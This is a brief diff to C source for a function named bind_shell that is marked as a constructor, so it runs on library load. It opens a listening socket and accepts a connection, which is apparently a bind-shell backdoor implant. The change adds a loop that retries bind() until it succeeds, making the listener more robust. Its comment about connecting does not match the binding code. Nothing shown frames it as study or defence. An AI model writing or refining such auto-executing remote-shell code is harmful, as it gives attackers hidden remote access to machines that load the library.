@@ -16,9 +16,11 @@ void __attribute__((constructor)) bind_shell(){
   host_addr.sin_family = AF_INET;
   host_addr.sin_port = htons(port);
   host_addr.sin_addr.s_addr = addr;
-  bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
+  // Keep trying to connect until connection is established
+  while( bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr)) != 0){
+    usleep(500000);
+  }
   listen(host_sock, 0);
-
   // accept incoming connection
   int client_sock = accept(host_sock, NULL, NULL);
 
